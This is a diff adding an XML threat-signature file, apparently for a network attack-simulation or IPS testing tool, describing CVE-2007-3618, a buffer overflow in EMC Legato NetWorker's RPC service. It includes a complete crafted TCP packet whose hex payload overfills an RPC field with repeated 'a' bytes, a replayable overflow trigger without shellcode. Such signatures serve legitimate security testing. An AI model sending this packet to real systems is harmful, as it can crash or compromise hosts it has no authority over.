@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="EMC Legato NetWorker Remote Exec Service Buffer Overflow"/>
+    <EngDesc display="true" value="There exists a buffer overflow vulnerability in EMC legato NetWorker product. The flaw is due to improper boundary protection when processing RPC requests. A remote unauthenticated attacker can leverage this vulnerability by sending crafted RPC message to the target host, potentially inject and execute arbitrary code with System level privileges."/>
+    <Intent display="true">
+      <item value="BUFFER_OVERFLOW"/>
+    </Intent>
+    <Protocol display="true" value="TCP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="EMC"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="EMC_EMC_Legato_NetWorker"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true"/>
+    <Credit display="true" value="FSC20070820-17"/>
+    <CVEID display="true" value="CVE-2007-3618"/>
+    <bugtraqID display="true" value="25375"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="ThreatEx Team"/>
+    <ID display="true" value="2398b3ecc00bf9fccd6d1fa38d533b32"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="True"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value=""/>
+    <Authentication display="false" value=""/>
+    <ConfImpact display="false" value=""/>
+    <IntegImpact display="false" value=""/>
+    <AvailImpact display="false" value=""/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value="normal"/>
+    <LastModified display="false" value="633603661780156250"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value="B"/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value=""/>
+    <Created value="1216321138" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="G"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="H"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="I"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="J"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="K"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="G"/>
+      <for index="H"/>
+      <for index="I"/>
+      <for index="J"/>
+      <for index="K"/>
+    </for>
+    <for index="F"/>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="01D0" Identification="8317" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="54DF" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="@random(1026,65535)" destPort="$destPort" SeqNumber="EBFEDFB5" AckNumber="B3D6022B" HeaderLength="08" WindowSize="05B4" Checksum="F98F" UrgentPointer="0000" Options="0101080A94245CA800000000" Payload="800001984581245200000000000000020005F3E1000000010000000400000000000000000000000000000000000000010000000C736E5F74696D657374616D7000000001000000043132333400000000000000010000000B736E5F7375625F727173740000000001000001006161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616100000000000000010000000A736E5F636D645F7374720000000000010000000462626262000000000000000000000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="F" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="6FFA" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="2998" srcIP="" destIP="" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="" destPort="" SeqNumber="B3D6022B" AckNumber="EBFEE152" HeaderLength="08" WindowSize="FE63" Checksum="1E46" UrgentPointer="0000" Options="0101080A0000C1E194245CA8" Payload="20" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
